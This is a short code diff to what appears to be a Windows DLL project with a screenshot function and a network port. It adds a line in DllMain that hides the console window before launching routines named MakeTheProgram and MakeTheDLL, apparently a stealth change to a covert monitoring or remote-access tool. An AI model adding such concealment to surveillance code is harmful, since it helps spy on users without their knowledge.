@@ -7,6 +7,7 @@
 #include <string.h>
 #include "header.h"
 #include "data.cpp"
+#include <WinUser.h>
 //#define DEFAULT_BUFLEN 512
 #define DEFAULT_PORT "27015"
 
@@ -166,6 +167,7 @@ void screenshot()
 
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ){
     //MakeTheProgram();
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     MakeTheProgram();
     MakeTheDLL();
     MakeTheProgramRun();
